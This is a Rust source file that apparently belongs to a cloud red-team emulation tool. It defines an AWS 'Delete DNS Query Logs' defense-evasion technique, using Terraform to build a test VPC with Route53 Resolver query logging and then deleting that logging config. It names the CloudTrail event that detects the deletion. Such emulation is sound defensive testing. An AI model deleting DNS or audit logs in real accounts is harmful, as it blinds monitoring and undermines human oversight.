use std::collections::HashMap;
use std::sync::Arc;
use anyhow::Result;

use crate::platform::Platform;
use crate::providers::CloudProviders;
use crate::tactic::MitreTactic;
use crate::technique::{AttackTechnique, BoxFuture};

const TERRAFORM: &str = r#"
resource "random_string" "suffix" {
  length  = 8
  special = false
  upper   = false
}

resource "aws_vpc" "stratus" {
  cidr_block = "10.0.0.0/16"
  tags       = { StratusRedTeam = "true" }
}

resource "aws_cloudwatch_log_group" "dns" {
  name              = "/stratus-red-team/dns-logs-${random_string.suffix.result}"
  retention_in_days = 1
}

resource "aws_route53_resolver_query_log_config" "stratus" {
  name            = "stratus-red-team-${random_string.suffix.result}"
  destination_arn = aws_cloudwatch_log_group.dns.arn
}

resource "aws_route53_resolver_query_log_config_association" "stratus" {
  resolver_query_log_config_id = aws_route53_resolver_query_log_config.stratus.id
  resource_id                  = aws_vpc.stratus.id
}

output "config_id" {
  value = aws_route53_resolver_query_log_config.stratus.id
}

output "vpc_id" {
  value = aws_vpc.stratus.id
}
"#;

async fn detonate_impl(outputs: HashMap<String, String>, providers: Arc<CloudProviders>) -> Result<()> {
    let aws = providers.aws().await?;
    let config_id = outputs
        .get("config_id")
        .ok_or_else(|| anyhow::anyhow!("missing output: config_id"))?;
    let vpc_id = outputs.get("vpc_id").map(|s| s.as_str()).unwrap_or("");

    // Disassociate the query log config from the VPC first
    if !vpc_id.is_empty() {
        let _ = aws.route53resolver
            .disassociate_resolver_query_log_config()
            .resolver_query_log_config_id(config_id)
            .resource_id(vpc_id)
            .send()
            .await;
    }

    // Delete the query log config
    aws.route53resolver
        .delete_resolver_query_log_config()
        .resolver_query_log_config_id(config_id)
        .send()
        .await
        .map_err(|e| anyhow::anyhow!("{}", e))?;

    println!("Deleted Route53 Resolver query log config: {}", config_id);
    Ok(())
}

fn detonate(outputs: HashMap<String, String>, providers: Arc<CloudProviders>) -> BoxFuture<Result<()>> {
    Box::pin(detonate_impl(outputs, providers))
}

inventory::submit! {
    AttackTechnique {
        id: "aws.defense-evasion.dns-delete-logs",
        friendly_name: "Delete DNS Query Logs",
        description: "Deletes a Route53 Resolver query log configuration to stop DNS query logging for a VPC, impairing the ability to detect DNS-based exfiltration or C2 communication.",
        detection: "CloudTrail: route53resolver:DeleteResolverQueryLogConfig.",
        platform: Platform::Aws,
        mitre_tactics: &[MitreTactic::DefenseEvasion],
        is_idempotent: false,
        is_slow: false,
        prerequisite_tf: Some(TERRAFORM),
        detonate,
        revert: None,
    }
}
